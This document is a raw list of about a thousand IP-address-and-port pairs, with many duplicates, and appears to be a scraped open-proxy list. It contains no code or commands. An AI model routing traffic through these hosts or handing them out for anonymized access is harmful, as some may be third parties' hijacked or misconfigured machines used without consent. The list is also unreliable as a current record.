51.161.33.206:26567
46.209.100.252:5678
213.136.79.177:56205
209.14.112.8:1080
162.214.163.137:26054
51.15.254.129:16379
203.161.32.242:61070
72.167.221.145:50335
95.111.227.164:9825
146.59.70.29:15259
51.89.173.40:17982
185.23.118.252:55158
184.168.121.153:1397
208.109.14.49:42072
178.79.165.164:60011
104.238.111.107:7757
50.235.117.234:39593
161.97.173.42:59799
51.15.247.93:16379
148.72.23.56:39396
94.181.33.149:40840
203.161.32.242:61356
50.63.12.33:58507
162.241.46.6:56241
162.241.46.40:62592
45.76.150.19:50685
162.241.50.179:34099
104.248.151.220:51040
192.169.244.80:49588
130.255.162.199:20398
146.59.18.246:20734
92.205.61.38:4726
178.79.165.164:12254
161.97.163.52:64120
104.238.111.107:15419
128.199.221.91:64579
132.148.155.180:36989
87.121.77.130:4145
190.145.182.4:4153
207.180.234.220:39737
192.163.200.82:11720
119.18.158.130:4153
157.230.250.185:51499
107.180.90.88:62908
208.109.14.49:34700
162.241.79.22:36936
92.205.110.118:64422
104.248.158.78:43620
181.115.207.115:1080
54.36.122.16:29796
178.79.165.164:36425
132.148.154.97:60349
66.29.131.58:30885
163.172.132.238:16379
208.109.14.49:46047
91.203.114.71:42905
181.13.142.45:5678
80.51.7.66:4145
51.158.64.130:16379
107.180.90.42:10670
162.241.50.179:57364
51.91.13.215:55637
208.109.13.93:56231
162.214.103.84:29503
216.10.242.18:40571
148.72.209.174:28295
162.214.102.121:5934
173.212.209.49:58827
209.14.112.5:1080
161.97.173.42:41558
31.42.184.144:57752
147.124.212.31:4671
45.81.232.17:27308
117.74.65.207:61011
67.205.177.122:10250
166.62.38.100:42126
192.169.226.96:31640
107.180.88.173:53312
45.76.150.19:50685
37.32.98.160:38440
161.97.147.193:15371
8.130.39.117:3389
23.19.244.109:1080
187.216.144.170:5678
45.138.87.238:1080
166.62.38.100:39308
89.218.8.152:1080
89.151.134.157:3629
46.160.90.81:5678
31.170.22.127:1080
91.92.80.199:4145
192.169.244.80:41568
177.184.67.69:4145
94.131.14.66:1080
165.227.104.122:58839
162.214.102.195:34227
1.15.62.12:5678
117.74.65.207:5555
162.241.6.97:56399
170.244.0.179:4145
162.241.79.22:35318
36.66.36.251:4153
67.227.186.23:64153
181.10.235.27:56034
148.72.206.131:45395
50.63.12.33:46599
166.62.38.100:55671
177.222.60.138:5678
103.35.189.217:1080
103.74.227.177:56417
66.228.33.190:44809
162.214.121.173:35183
92.204.134.38:34261
157.230.250.185:25785
123.25.116.228:1080
162.214.75.79:52163
79.98.1.32:34746
51.38.63.124:10983
173.212.209.49:64309
148.72.23.56:41383
209.126.104.38:40053
50.63.12.33:52814
201.93.159.234:4145
135.148.10.161:3970
107.180.88.173:24766
128.199.165.63:58951
103.165.175.71:5678
104.236.0.129:29249
213.171.44.82:3629
198.12.255.193:48572
194.8.232.46:4153
104.37.12.129:1080
36.93.138.74:5678
132.148.128.8:7392
146.59.18.246:15860
51.15.241.5:16379
162.215.219.157:41697
192.169.226.96:43328
50.197.210.138:32100
65.49.82.7:58195
138.0.229.232:4153
117.74.120.128:1133
92.205.61.38:21286
162.255.110.52:5678
154.16.116.166:39759
163.172.149.133:16379
198.12.255.193:6821
104.238.111.107:15073
192.163.200.200:19747
66.29.131.58:30060
159.224.243.185:61303
31.200.242.201:15755
85.89.184.87:5678
182.53.224.189:4153
181.115.207.114:1080
207.244.229.34:7976
202.183.155.242:4153
139.162.238.184:29588
109.232.106.150:52435
36.92.87.73:5678
92.205.28.245:8560
159.223.166.21:5199
117.4.242.216:5678
50.63.12.33:23859
37.187.91.192:11721
162.214.121.173:64382
212.50.19.150:4153
162.241.53.72:31414
103.72.79.250:5122
173.212.209.49:39522
104.238.111.107:28394
92.204.134.38:28695
116.50.174.181:17066
5.75.161.31:48237
104.238.111.107:36049
159.223.71.71:49922
50.63.12.33:50781
45.234.100.102:1080
159.223.166.21:47460
50.63.12.33:62592
62.171.169.37:58402
147.124.212.31:51825
92.204.134.38:25825
209.126.5.138:63886
207.180.198.241:35119
192.169.226.96:4850
50.63.12.33:9367
159.223.71.71:59098
51.15.223.12:16379
8.130.36.245:9000
218.3.253.238:10800
148.72.209.174:2906
107.180.90.88:63100
45.81.232.17:5932
185.109.184.150:53155
147.124.212.31:24230
190.2.115.33:4153
161.97.173.78:3881
181.212.136.34:5199
162.241.158.204:62847
157.230.250.185:17773
92.205.61.38:4726
148.72.23.56:42312
114.4.200.222:5678
162.241.53.72:49858
31.24.44.92:50109
194.163.129.90:43076
159.223.166.21:1372
128.199.221.91:2215
198.12.255.193:9375
185.82.238.203:5678
50.250.56.129:9898
213.136.79.177:13675
161.97.163.52:23288
213.136.78.200:40927
148.66.130.53:54209
188.164.197.178:55677
161.97.173.78:17732
192.163.202.88:47585
162.241.50.179:37876
118.67.223.4:5678
92.204.134.38:51123
117.74.65.207:8009
36.93.138.75:5678
45.81.232.17:47056
88.202.230.103:39647
51.89.173.40:11058
92.205.110.118:18374
154.16.116.166:2512
162.240.147.48:37704
188.165.252.198:10661
148.72.23.56:39396
117.74.65.207:53446
185.209.28.109:80
12.11.59.114:1080
163.172.147.89:16379
51.38.63.124:27294
158.69.196.236:45731
51.79.87.144:22500
186.216.195.1:4153
107.180.95.177:1405
148.66.130.53:13305
89.41.106.8:4145
94.232.11.178:58028
51.158.105.203:16379
50.199.46.20:32100
202.40.181.220:31247
162.214.162.156:46369
162.55.87.48:5566
92.205.60.110:32503
103.118.47.74:4145
172.104.154.229:1120
36.64.238.82:1080
213.14.31.123:35314
163.172.132.238:16379
91.142.222.84:57041
91.200.114.58:55749
159.148.146.65:5678
194.31.79.75:31471
185.186.17.57:5678
45.81.232.17:21481
144.76.96.180:5566
46.173.175.166:10801
162.241.53.72:57364
104.238.111.107:5484
51.15.196.107:16379
92.204.135.203:29212
157.230.250.185:1279
213.210.67.186:3629
45.138.87.238:1080
85.237.62.189:3629
64.91.226.205:64441
163.172.165.36:16379
103.242.175.119:8899
24.37.245.42:51056
45.81.232.17:5709
135.148.10.161:3970
162.241.50.179:40179
192.99.207.129:29360
162.241.46.40:62244
192.99.207.129:26567
51.75.126.150:15474
128.199.221.91:49865
162.214.170.144:16684
148.66.130.53:31907
188.164.196.31:56392
192.99.207.129:2542
144.91.66.30:42711
94.23.220.136:40767
70.35.213.226:4153
109.238.12.156:24586
24.75.156.114:3366
51.222.241.8:49559
77.77.26.152:4153
165.227.196.37:58628
213.145.137.102:37447
162.241.158.204:58447
111.8.155.54:7777
107.180.95.177:63951
165.227.196.37:63742
148.72.212.252:33516
51.89.173.40:51612
164.92.237.188:63373
51.158.119.71:16379
192.169.226.96:32074
103.47.216.19:4145
148.72.41.47:40350
148.72.23.56:46451
164.92.86.113:50564
169.255.136.8:60279
162.241.46.54:58330
64.202.186.2:32884
212.115.232.79:10800
92.255.164.166:4145
92.205.110.47:55509
148.72.214.6:11272
162.144.103.99:60415
198.12.255.193:53281
51.89.21.99:11158
161.97.173.42:24148
163.172.171.22:16379
161.97.147.193:55283
45.81.232.17:59421
38.50.130.93:5678
198.12.255.193:22785
109.238.12.156:24586
135.148.10.161:6716
208.109.14.49:35618
162.214.121.11:2993
194.31.79.75:2582
50.63.12.33:14738
104.248.158.78:47225
67.227.186.23:57676
166.62.38.100:54083
50.63.12.33:14738
51.89.173.40:23313
188.163.170.130:35578
95.111.227.164:18415
82.223.121.72:4985
51.158.124.167:16379
72.167.222.113:48892
130.255.162.199:52039
66.228.33.190:14791
208.109.14.49:36795
162.241.79.22:36936
31.24.44.92:58815
148.72.206.84:2536
172.93.111.87:40166
45.187.76.2:3629
92.204.135.203:34780
50.63.12.33:51904
192.99.207.129:26567
135.148.10.161:31696
162.214.191.59:33977
212.87.255.155:5678
104.238.111.107:7757
203.96.177.211:12183
162.241.50.179:57364
162.214.170.144:34617
94.23.220.136:29295
162.241.79.22:48012
147.124.212.31:13276
213.136.79.177:13675
148.72.23.56:3260
167.172.159.43:1162
104.236.171.128:41047
197.232.47.102:52567
45.144.30.205:443
148.72.212.198:26046
157.230.250.185:61214
117.74.65.207:39732
162.241.46.40:49401
117.74.65.207:61011
162.241.46.6:61579
213.136.78.200:58283
189.91.85.133:31337
213.136.79.177:46039
162.214.103.84:29503
201.174.17.126:7755
117.74.65.207:8009
159.223.71.71:56581
107.180.88.173:35774
148.72.41.47:40350
1.15.62.12:5678
97.74.233.206:16744
176.236.37.132:1080
208.109.14.49:7218
36.64.238.82:1080
165.227.104.122:58839
64.202.186.2:42587
166.62.88.163:26190
148.72.206.84:41691
94.131.14.66:1080
58.75.126.235:4145
132.148.245.112:49824
51.79.87.144:30464
67.205.177.122:21108
176.99.2.43:1080
23.19.244.109:1080
117.74.65.207:54466
162.243.55.12:59179
51.75.71.110:11507
209.126.104.38:40750
51.15.212.207:16379
91.241.131.179:9834
45.172.177.253:59341
1.179.148.9:36476
12.89.124.138:4145
162.214.90.49:59997
45.81.232.17:21481
213.32.252.134:5678
31.170.22.127:1080
45.138.87.238:1080
165.227.196.37:63399
79.98.1.32:34746
192.163.201.131:8896
213.136.79.177:56205
161.97.163.52:13106
95.111.227.164:62653
117.74.65.207:39732
162.241.50.179:40179
162.241.79.22:50207
66.228.33.190:24360
172.93.111.87:61645
70.35.213.226:4153
147.124.212.31:30508
92.204.135.203:61635
92.204.134.38:25675
104.238.111.107:53777
138.197.92.110:38552
178.79.165.164:12254
207.244.255.174:49675
51.38.63.124:27294
67.227.186.23:64153
146.59.70.29:8446
91.224.179.175:5678
185.220.174.99:59967
46.214.153.223:5678
5.135.137.13:59124
187.86.153.254:30660
37.26.86.206:4145
198.12.255.193:22785
107.180.88.173:58620
45.81.232.17:53288
192.99.207.129:26567
162.241.46.6:50062
162.241.46.40:60708
45.79.56.187:40114
162.241.50.179:31414
195.138.65.34:5678
5.188.66.181:8088
167.172.159.43:1162
194.163.129.90:43076
162.214.170.144:34617
111.8.155.54:7777
169.255.198.8:5678
148.66.130.53:15345
37.32.98.160:7302
92.204.134.38:52929
51.15.132.215:16379
146.59.18.246:40975
67.227.186.83:63716
207.180.198.241:50861
62.103.186.66:4153
181.129.198.58:5678
124.105.55.176:30906
67.227.186.23:57676
162.241.46.54:46849
162.240.39.58:45840
146.59.18.246:20734
162.241.6.97:62847
178.32.143.55:32048
104.238.111.107:56225
132.148.128.8:22773
125.27.10.84:4153
95.128.142.76:1080
66.29.131.58:30060
207.180.234.220:36946
46.173.35.229:3629
37.18.73.60:5566
88.202.230.103:55624
43.248.25.6:4145
198.12.255.193:45274
50.250.56.129:9898
166.62.38.100:42126
110.77.135.70:4145
162.241.45.22:50528
104.251.212.206:34012
51.222.241.8:62916
92.205.61.38:48664
200.85.34.174:4153
104.248.151.220:63997
45.6.94.159:4153
50.63.13.3:40129
23.19.244.109:1080
51.89.173.40:20435
46.99.252.42:10805
199.85.209.166:61430
51.75.126.150:15474
51.79.87.144:18636
67.213.212.53:38354
162.241.45.22:50207
75.119.145.169:62630
148.72.23.56:42312
185.129.250.183:14462
147.124.212.31:16844
31.200.242.201:15755
51.75.126.150:36323
198.12.255.193:28763
165.227.104.122:41443
94.23.252.168:9180
164.92.86.113:54597
12.187.55.1:39593
103.113.71.230:1080
190.104.26.227:33638
107.180.90.88:55347
50.250.75.153:39593
176.118.52.129:3629
192.169.226.96:50578
95.31.42.199:3629
162.241.46.6:60708
162.241.50.179:40179
162.241.46.6:56241
36.64.214.50:1080
66.228.37.252:7841
154.16.116.166:2512
50.63.12.33:45134
50.63.12.33:50781
104.236.0.129:29249
116.202.235.157:63135
166.0.235.2:40626
162.241.6.97:58447
162.241.53.72:57495
161.97.173.42:59799
117.202.20.70:1088
109.238.12.156:26912
75.119.145.169:16216
162.214.170.144:16684
209.126.104.38:40053
162.240.72.139:20270
162.241.45.22:55610
31.200.242.201:12196
166.62.85.184:21946
162.240.72.139:20614
162.214.163.137:26054
162.241.46.6:53477
117.74.65.207:53446
163.172.144.132:16379
157.230.250.185:51499
164.92.86.113:63358
159.203.5.54:58249
172.93.111.87:15805
198.12.255.193:6821
162.240.22.184:43494
162.214.121.11:8989
162.214.197.102:57785
162.240.72.139:20614
31.170.22.127:1080
154.16.116.166:39759
198.12.255.193:48572
159.148.146.65:5678
144.91.68.111:41170
213.16.81.147:5678
51.89.173.40:23313
103.72.79.250:55644
188.164.197.178:25348
74.62.23.242:39593
82.223.121.72:54368
103.121.39.158:1080
197.232.43.224:1080
161.97.165.57:6484
92.204.134.38:42674
178.79.165.164:40595
192.169.244.80:49588
216.10.242.18:38131
162.241.158.204:62847
162.214.191.209:33977
94.23.252.168:9180
188.164.197.178:4026
166.62.38.100:8730
173.249.33.122:13576
103.164.190.221:5430
159.223.166.21:5199
66.228.35.209:44809
162.214.90.49:57785
185.51.92.103:51327
162.214.75.237:52327
162.0.220.234:57020
146.59.70.29:51281
72.167.221.145:42043
51.161.33.206:29360
51.15.223.12:16379
147.124.212.31:4671
109.238.12.156:28618
148.72.206.250:28643
148.72.23.56:3260
148.72.209.174:31590
188.164.197.178:60021
66.248.237.179:56740
128.199.221.91:49865
165.227.104.122:29992
185.109.184.150:53155
104.248.151.220:60915
51.75.125.208:40998
5.58.47.25:3629
190.232.89.125:5678
51.89.173.40:44719
188.164.193.178:17585
139.162.238.184:32964
188.164.193.178:11251
184.168.121.153:1397
203.161.32.242:50640
148.72.206.84:14815
104.37.175.206:53723
81.16.1.71:5678
50.63.12.101:2953
51.89.173.40:27887
163.172.165.36:16379
92.205.110.118:54440
148.72.206.84:2536
184.168.121.153:41243
162.214.121.11:18809
51.15.223.24:16379
162.241.158.204:58447
92.204.134.38:7785
185.95.227.244:4145
92.205.110.118:26570
91.142.222.84:22735
103.221.254.102:54409
103.127.56.236:5678
92.204.134.38:54467
37.187.73.7:23637
154.12.253.232:57447
51.158.96.66:16379
66.228.37.252:14791
92.204.134.38:28695
160.153.245.187:8682
209.142.64.219:39789
177.8.170.122:1080
166.62.38.100:39308
36.92.96.179:5678
162.241.53.72:31414
178.212.51.166:33333
185.139.56.133:4145
162.214.170.144:16684
162.241.6.97:52000
129.205.244.158:1080
199.85.209.142:61430
209.198.43.52:5678
185.215.53.201:3629
154.12.253.232:47800
151.236.39.7:59202
46.219.1.5:5678
201.174.17.126:7755
207.244.229.34:7976
209.126.104.38:39369
107.180.88.173:44568
109.75.34.152:59341
176.197.144.158:4153
46.226.148.105:9352
51.75.126.150:21497
45.79.134.70:28866
166.62.38.100:54083
103.165.37.245:4145
162.214.170.144:37362
170.244.0.179:4145
154.16.116.166:2512
107.180.88.173:24766
130.193.123.34:5678
23.19.244.109:1080
209.142.64.219:39789
165.227.104.122:58839
194.31.79.75:50920
107.180.90.88:20309
43.135.162.16:47069
107.180.88.173:53312
51.15.142.4:16379
178.212.48.84:1080
91.203.114.71:42905
185.236.46.221:5678
162.240.22.184:48026
45.138.87.238:1080
177.38.245.109:55713
185.186.17.57:5678
50.63.12.33:58507
92.205.110.47:50709
185.43.189.182:3629
162.243.55.12:59179
162.240.19.133:56483
50.63.13.3:34515
130.255.162.199:20398
162.241.79.22:39107
45.81.232.17:33549
91.213.119.246:46024
109.94.182.128:4145
107.180.90.248:40330
91.224.179.175:5678
93.182.76.244:5678
5.135.137.13:59124
91.213.119.246:46024
185.151.146.178:1234
31.42.184.144:57752
37.187.141.160:49039
47.180.63.37:54321
164.132.112.254:44664
150.107.207.137:57230
51.91.13.215:55637
200.85.52.254:5678
207.244.255.174:49675
159.224.243.185:61303
181.129.74.58:30431
24.37.245.42:51056
31.170.22.127:1080
148.72.23.56:41383
148.66.130.187:63840
92.204.135.203:34780
51.161.99.114:29758
190.144.224.182:44550
132.148.154.98:50965
51.89.173.40:11058
192.99.37.195:18020
168.227.158.9:4145
103.18.47.79:4145
209.126.5.138:63886
1.15.62.12:5678
194.233.78.142:49628
51.38.63.124:27294
165.227.196.37:63742
86.111.144.10:4145
104.238.111.107:15073
197.232.47.102:52567
101.51.121.29:4153
51.161.33.206:26567
51.75.126.150:15474
45.249.48.217:4153
109.123.254.43:54878
162.241.158.204:52000
132.148.155.180:36989
51.158.124.167:16379
115.76.193.12:5311
37.26.86.206:4145
54.36.108.149:38949
185.18.198.163:43155
51.15.230.100:16379
51.222.241.8:7822
62.109.0.18:24202
144.76.96.180:5566
161.97.147.193:43131
31.43.33.56:4153
64.124.145.1:1080
103.165.175.71:5678
192.140.42.83:59057
46.99.252.42:10805
213.6.38.50:59422
162.55.87.48:5566
185.46.170.253:4145
154.79.242.178:10801
38.242.136.254:15625
162.241.79.22:35318
91.203.114.71:42905
185.51.92.108:51327
188.190.176.114:5678
190.104.26.227:33638
165.227.196.37:63399
165.227.104.122:29992
157.230.250.185:17773
138.0.229.232:4153
129.205.244.158:1080
182.16.171.65:51459
88.204.216.142:33156
66.228.33.190:14791
202.40.181.220:31247
138.197.92.110:38552
50.63.12.33:45134
93.182.76.244:5678
66.228.37.252:7841
194.163.129.90:43076
51.158.124.167:16379
109.238.12.156:24586
92.204.134.38:34261
188.164.197.178:4026
91.247.250.215:4145
104.238.111.107:37963
50.197.210.138:32100
5.135.137.13:59124
111.8.155.54:7777
162.241.6.97:62847
161.97.147.193:43131
165.227.196.37:53718
103.144.209.104:3629
92.204.135.203:29212
192.169.226.96:32074
198.12.255.193:6821
148.72.23.56:3260
161.97.74.176:30000
148.72.206.84:14815
165.227.196.37:54266
51.222.241.8:49559
104.248.151.220:60018
157.230.250.185:61214
192.99.207.129:2542
94.23.252.168:9180
165.227.196.37:63551
107.180.90.88:55347
107.180.90.88:20309
162.241.46.69:34236
162.214.197.102:57785
165.227.104.122:41443
107.180.88.173:35774
132.148.155.180:36989
146.59.18.246:64741
148.66.130.53:21794
146.59.18.246:40975
50.63.13.3:40129
162.241.6.97:52000
51.222.241.8:62916
166.62.38.100:42126
147.124.212.31:55361
162.241.50.179:40179
23.19.244.109:1080
162.241.46.69:53783
50.63.13.3:41412
192.163.200.82:11720
163.172.129.251:16379
162.241.158.204:52000
50.63.12.33:14738
92.204.134.38:7785
51.158.68.237:16379
166.62.38.100:54083
162.241.158.204:62847
162.241.6.97:58447
92.204.134.38:51123
163.172.147.9:16379
162.241.53.72:47856
104.238.111.107:45883
162.214.170.144:37362
192.99.207.129:29360
132.148.128.8:7392
104.251.212.206:34012
94.23.220.136:29295
50.63.12.33:9367
132.148.245.112:49824
162.241.79.22:36936
147.182.194.76:29703
162.241.46.6:60708
161.97.147.193:15371
162.241.46.40:62244
165.227.104.122:58839
111.8.155.54:7777
162.241.79.22:39107
51.15.139.15:16379
216.215.125.178:48324
50.63.13.3:60315
104.236.0.129:29249
51.89.173.40:51612
103.35.189.217:1080
92.204.134.38:42571
103.84.178.193:4153
159.89.194.121:8738
128.199.221.91:64579
128.199.221.91:33383
162.241.53.72:55693
162.241.46.40:56241
159.203.5.54:58249
187.210.136.88:4153
67.225.255.197:55889
147.124.212.31:4671
134.122.43.203:56442
51.161.33.206:2542
31.200.242.201:15755
160.153.245.187:35138
37.187.91.192:17605
162.241.53.72:49858
107.180.89.185:49062
162.214.121.11:18809
45.79.134.70:28866
50.63.13.3:31503
50.63.12.33:23065
132.148.20.70:18504
92.205.110.118:5513
92.205.110.118:54440
107.180.101.226:35316
1.15.62.12:5678
161.97.163.52:23288
209.126.104.38:39039
166.62.38.100:4765
162.240.208.98:43704
50.63.12.33:40838
147.124.212.31:36779
135.148.10.161:51507
72.167.221.145:50335
213.136.78.200:20256
64.124.191.98:32688
166.62.38.100:39308
146.59.70.29:51281
162.241.46.6:53477
200.58.182.89:4153
103.72.79.250:55644
174.136.57.169:33761
72.167.221.145:42043
51.161.33.206:29360
45.81.232.17:59421
92.205.110.47:19600
51.15.210.79:16379
162.214.102.121:5934
147.124.212.31:30508
45.81.232.17:23363
43.135.162.16:47069
209.126.104.38:16608
162.241.46.40:62592
66.29.131.58:30885
188.164.193.178:11251
104.247.163.246:54094
66.228.33.190:7841
45.81.232.17:21481
72.167.8.5:44774
51.15.223.24:16379
92.205.61.38:4300
164.92.86.113:52494
31.170.22.127:1080
50.63.13.3:55749
209.126.104.38:44412
51.75.71.110:11507
162.241.50.179:55693
194.31.79.75:31471
62.171.131.101:1385
148.72.23.56:41383
95.216.224.61:59792
162.255.108.5:5678
146.59.70.29:22975
82.223.121.72:64871
181.13.142.45:5678
164.92.237.188:62586
95.31.35.210:3629
164.92.237.188:53238
51.15.254.129:16379
51.89.173.40:11058
5.252.23.206:1080
162.214.197.102:42019
132.148.245.247:31406
194.31.79.75:2582
192.169.226.96:43328
14.241.241.185:4145
162.214.170.144:39503
54.36.122.16:29796
162.241.79.22:50207
148.72.209.174:2906
166.62.38.100:2453
89.151.251.50:32000
162.241.79.22:32371
51.15.241.5:16379
51.75.71.110:47503
51.89.173.40:23313
51.38.63.124:10983
64.227.108.182:37220
66.228.37.252:14791
103.217.213.145:4145
50.63.12.33:58507
160.153.245.187:38586
51.91.13.215:55637
107.180.88.173:53312
162.243.55.12:50941
148.72.206.250:35703
148.66.130.53:56350
181.212.136.34:5199
172.93.111.235:43520
135.148.10.161:31696
162.241.53.72:53755
181.212.136.34:42400
166.62.38.100:8730
137.184.182.145:28357
107.180.88.173:59820
213.136.78.200:40927
95.111.227.164:54576
148.72.212.198:35264
148.72.215.79:13305
148.72.209.174:14439
51.254.220.248:55174
45.172.177.253:59341
37.187.91.192:27898
46.99.252.42:10805
37.18.73.60:5566
51.222.241.8:62916
91.224.179.175:5678
36.66.36.252:4153
36.92.96.179:5678
45.138.87.238:1080
66.228.33.190:24360
1.9.27.212:4153
67.225.255.197:55889
36.64.214.50:1080
103.74.227.177:56417
92.204.135.203:29212
72.252.4.49:4145
92.204.134.38:7785
119.59.113.178:45741
50.197.210.138:32100
51.15.142.4:16379
31.163.204.200:4153
51.75.126.150:51713
45.81.232.17:9165
45.144.30.199:443
103.165.37.245:4145
62.73.127.98:9898
38.50.130.93:5678
50.63.13.3:31503
103.121.39.158:1080
142.93.151.99:45365
50.63.12.33:9367
50.63.12.33:23065
51.38.63.124:27294
158.69.196.236:45731
47.180.63.37:54321
50.63.12.33:30920
50.63.12.33:40838
91.213.119.246:46024
43.135.162.16:47069
45.81.232.17:48085
51.158.79.76:16379
51.75.71.110:11507
50.63.12.33:45134
54.36.122.16:44587
37.187.91.192:11721
50.63.13.3:40129
89.41.106.8:4145
72.167.221.145:42043
51.89.173.40:31724
51.15.132.215:16379
94.131.14.66:1080
92.204.135.203:61635
45.79.134.70:28866
50.63.13.3:50887
92.205.110.118:5513
45.81.232.17:30696
104.238.111.107:36049
107.180.88.173:24766
101.51.121.29:4153
50.63.12.33:61464
50.63.13.3:41412
144.76.96.180:5566
67.227.186.83:63716
107.180.90.88:20309
107.180.95.177:64731
50.63.12.33:14738
66.228.35.209:46695
104.236.171.128:41047
65.49.82.7:58195
51.75.126.150:21497
159.148.146.65:5678
107.180.90.42:10670
103.242.175.119:7891
51.89.173.40:40179
109.238.12.156:1365
46.214.153.223:5678
64.227.108.182:37220
92.205.110.47:14936
85.100.40.12:5678
92.205.61.38:48664
83.56.15.57:5678
49.229.36.210:4153
104.238.111.107:28394
114.4.200.222:5678
72.167.222.113:12581
67.227.186.23:57676
51.75.125.208:40998
91.199.93.32:4153
50.250.75.153:39593
111.8.155.54:7777
154.12.253.232:4607
113.53.29.228:13629
132.148.16.169:55610
107.180.95.177:1405
54.38.179.162:56613
50.63.12.33:52814
139.162.238.184:32964
78.128.81.220:31623
154.16.116.166:2512
92.205.61.38:50903
50.63.13.3:60315
162.214.75.237:52327
166.62.36.126:45982
103.81.117.122:4153
85.89.184.87:5678
164.92.237.188:63373
107.180.90.88:55347
64.202.186.2:33154
104.251.212.206:34012
161.97.147.193:55283
162.241.45.22:50207
92.205.61.38:64272
92.205.110.118:3414
104.238.111.107:45883
162.241.79.22:35318
94.23.220.136:29295
92.204.134.38:28695
107.180.88.173:59820
104.248.151.220:59755
92.204.134.38:59727
162.241.46.54:46849
157.230.250.185:1279
104.238.111.107:5452
103.113.71.230:1080
107.180.101.226:35316
103.242.175.119:8899
75.119.145.169:62630
92.205.61.38:36073
146.59.18.246:30673
92.205.60.110:32503
92.205.61.38:4726
166.62.38.100:55671
92.204.134.38:42571
132.148.167.243:41644
92.205.61.38:24663
107.180.88.173:35774
92.205.61.38:4300
103.95.97.50:4153
139.162.238.184:29588
139.162.238.184:55482
104.238.111.107:29015
80.51.7.66:4145
132.148.128.8:7392
104.238.111.107:30026
103.169.189.98:8080
103.47.216.19:4145
162.241.158.204:58447
131.161.68.41:35944
162.241.46.40:60102
139.162.238.184:47310
146.59.18.246:9986
81.199.14.49:1088
162.55.87.48:5566
132.148.16.169:41824
167.179.45.56:4153
162.241.158.204:52000
134.122.43.203:56442
92.255.190.41:4153
107.180.90.88:62908
135.148.10.161:31696
162.241.46.6:62244
162.241.6.97:52000
157.230.250.185:61214
132.148.20.70:18504
137.184.182.145:28357
104.247.163.246:54094
132.148.154.98:50965
163.172.165.36:16379
109.123.254.43:10769
104.238.111.107:15419
146.59.18.246:15860
151.236.39.7:59202
190.14.224.244:3629
162.241.79.22:36936
162.243.55.12:50941
162.241.158.204:62847
148.72.206.84:14815
162.240.72.139:20270
165.227.196.37:63742
107.180.90.88:29869
163.172.147.89:16379
148.72.209.174:39027
162.240.147.48:37704
161.97.173.42:41558
128.199.221.91:2215
162.241.6.97:56399
163.172.144.132:16379
103.233.2.90:47270
148.72.209.174:31590
200.43.231.4:4153
165.227.196.37:54266
148.66.130.53:12005
162.241.50.179:40179
132.148.167.243:40961
163.172.149.133:16379
162.241.46.40:33268
117.74.65.207:39732
117.74.65.207:53446
117.74.65.207:5555
117.74.65.207:8009
162.241.46.40:62244
117.74.65.207:54466
146.59.70.29:52276
146.59.70.29:6147
128.199.165.63:33574
178.79.165.164:64354
147.124.212.31:4671
148.72.41.47:40350
162.240.22.184:48026
162.214.102.195:56755
132.148.16.169:11320
166.62.38.100:54083
147.124.212.31:30508
165.227.104.122:58839
147.124.212.31:16844
160.153.245.187:35138
162.214.102.195:50366
154.12.253.232:12263
157.230.250.185:51499
192.99.207.129:2542
148.72.23.56:39396
162.241.46.40:56241
164.92.86.113:52494
154.18.220.190:5678
157.230.250.185:17773
167.99.39.82:13486
157.230.250.185:13052
162.241.50.179:31414
164.52.42.2:4145
162.214.103.84:48292
146.59.18.246:64741
162.214.197.102:42019
166.62.38.100:2453
162.241.50.179:35948
176.113.157.149:37417
147.124.212.31:55361
162.241.6.97:58447
148.72.212.183:18777
162.241.46.40:62592
163.172.158.70:16379
160.153.245.187:42879
159.89.194.121:42490
148.72.23.56:4833
159.223.71.71:62572
162.214.162.156:46369
167.99.39.82:46015
185.95.227.244:4145
162.144.121.232:16795
178.212.51.166:33333
159.223.71.71:59243
164.92.237.188:57392
165.227.196.37:56755
201.174.17.126:7755
190.249.169.153:3629
173.212.209.49:44416
192.163.200.200:18646
162.241.45.22:50528
174.136.57.169:33761
144.76.96.180:5566
192.169.226.96:51778
166.62.38.100:39308
185.129.250.183:26777
176.126.85.247:16379
1.15.62.12:5678
200.85.34.174:4153
176.241.89.244:50547
173.212.209.49:36790
172.93.111.87:15805
207.244.255.174:49675
192.163.200.82:11720
181.13.142.45:5678
202.69.38.42:5678
165.227.196.37:54266
66.228.35.209:44809
37.187.91.192:11721
173.212.237.43:6775
198.57.211.235:11096
207.180.234.220:48963
167.172.159.43:1162
216.215.125.178:48324
190.54.12.74:5678
203.96.177.211:48553
186.211.6.137:4145
107.180.90.42:10670
190.138.250.48:3629
209.142.64.219:39789
135.148.10.161:3970
198.12.255.193:48572
165.227.104.122:58839
188.164.197.178:4026
111.8.155.54:7777
185.245.38.200:4145
188.164.193.178:17585
217.145.199.47:56746
178.79.165.164:60011
192.99.37.195:18020
213.136.79.177:13675
192.169.226.96:32074
190.220.1.173:35376
187.86.153.254:30660
200.108.190.6:9800
198.12.253.239:38588
50.63.12.33:34644
209.142.64.219:39789
162.214.170.144:16684
209.126.104.38:40053
162.55.87.48:5566
209.126.104.38:40750
162.240.72.139:20270
195.74.72.111:5678
185.97.114.179:3629
166.62.38.100:42126
212.115.232.79:10800
198.12.255.193:6821
159.223.166.21:49174
202.29.220.202:61507
209.126.104.38:15097
202.40.186.66:1088
159.203.5.54:58249
92.204.134.38:51123
188.164.196.30:62966
162.241.46.40:49401
188.166.234.144:19738
208.109.14.49:50540
208.109.14.49:59760
176.99.2.43:1080
209.126.104.38:39039
198.12.255.193:22785
208.109.14.49:37377
208.109.14.49:7218
194.163.159.93:2942
198.12.255.193:40099
194.31.79.75:31471
162.241.46.54:46849
178.79.165.164:64354
194.31.79.75:29671
207.180.198.241:35119
207.180.234.220:48963
213.226.11.149:59086
190.151.166.99:4153
162.241.6.97:56399
203.96.177.211:12183
94.23.252.168:9180
92.205.61.38:24183
188.164.196.31:62966
162.240.147.48:37704
192.169.226.96:50578
162.241.45.22:50207
107.180.90.248:40330
188.164.193.178:17585
207.180.198.241:57327
51.158.96.66:16379
162.241.45.22:63501
208.109.14.49:34700
198.12.255.193:6821
216.10.242.18:40571
54.36.122.16:44587
62.171.131.101:1629
202.131.246.250:5678
207.180.198.241:50861
188.164.196.31:53276
132.148.128.8:22773
146.59.70.29:37665
92.205.110.47:19600
95.111.227.164:18415
208.109.14.49:36795
208.109.14.49:11733
203.96.177.211:12183
192.163.201.131:39782
51.15.142.4:16379
188.164.196.31:53592
37.18.73.60:5566
148.72.23.56:60069
178.79.165.164:7377
178.79.165.164:29990
103.242.175.119:7891
128.199.221.91:21605
50.63.12.33:31785
190.2.115.33:4153
108.175.24.1:13135
50.63.12.33:52814
114.4.200.222:5678
195.74.72.111:5678
103.174.36.112:5678
183.88.247.52:4153
